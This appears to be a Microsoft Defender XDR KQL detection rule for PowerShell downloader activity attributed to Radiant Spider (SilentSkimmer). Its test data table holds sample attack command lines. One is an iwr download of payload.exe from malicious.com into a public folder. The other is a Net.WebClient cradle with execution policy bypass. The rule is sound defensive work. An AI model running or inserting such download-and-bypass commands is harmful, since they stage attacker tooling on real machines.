# Name
Radiant Spider (SilentSkimmer) - PowerShell Downloader Artifacts & Execution Policy Bypass

# Description
This detection identifies aggressive PowerShell downloader commands associated with Radiant Spider (SilentSkimmer) campaigns. It covers the use of Invoke-WebRequest (iwr) to download payloads into public directories, Net.WebClient download cradles, and execution policy bypass flags. These patterns are consistent with observed Radiant Spider post-exploitation activity where PowerShell is used to stage additional tooling.

# References
- https://www.crowdstrike.com/adversaries/radiant-spider/
- https://www.sleuthcon.com/radiant-spider-unveiled
- https://unit42.paloaltonetworks.com/silent-skimmer-latest-campaign/

# Author
- M4nbat

# Socials
- https://www.linkedin.com/in/grjk83/
- @knappresearchlb

# Threats
- RADIANT SPIDER
- CL-CRI-0941
- SilentSkimmer

# MITRE ATT&CK
- T1059.001: Command and Scripting Interpreter: PowerShell
- T1105: Ingress Tool Transfer

# Data Sources
- Microsoft Defender XDR
  - DeviceProcessEvents

# Query

## Query 2: PowerShell Downloader Artifacts & Execution Policy Bypass

```kql
// Test Data Table
let DeviceProcessEvents = datatable(
    Timestamp: datetime,
    DeviceId: string,
    DeviceName: string,
    ActionType: string,
    FileName: string,
    FolderPath: string,
    SHA256: string,
    ProcessCommandLine: string,
    ProcessId: long,
    AccountName: string,
    AccountDomain: string,
    InitiatingProcessFileName: string,
    InitiatingProcessCommandLine: string,
    InitiatingProcessId: long,
    InitiatingProcessParentFileName: string
)
[
    // Case 1: iwr to public directory
    datetime(2026-02-19 11:15:30), "device-guid-2", "DB01.contoso.com", "ProcessCreated", 
    "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "a5b3c2d1...", 
    "powershell iwr http://malicious.com/payload.exe -outfile c:\\users\\public\\payload.exe", 8832, "SYSTEM", "NT AUTHORITY", 
    "cmd.exe", "cmd.exe /c powershell...", 5100, "svchost.exe",
    
    // Case 2: Net.WebClient and bypass
    datetime(2026-02-19 11:20:00), "device-guid-2", "DB01.contoso.com", "ProcessCreated", 
    "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "b2c3d4e5...", 
    "powershell -executionpolicy bypass -c \"(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.txt')\"", 6620, "SYSTEM", "NT AUTHORITY", 
    "cmd.exe", "cmd.exe /c powershell...", 3200, "svchost.exe"
];
// Detection Logic
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName =~ "powershell.exe" or FileName =~ "pwsh.exe"
// Match any of the specific Radiant Spider PowerShell behaviors
| where (ProcessCommandLine has_any("iwr", "Invoke-WebRequest") and ProcessCommandLine has "-outfile" and ProcessCommandLine has_any("c:\\users\\public\\", "c:/users/public/"))
   or (ProcessCommandLine has "Net.WebClient")
   or (ProcessCommandLine has "-executionpolicy bypass" or ProcessCommandLine has "-ep bypass")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
```
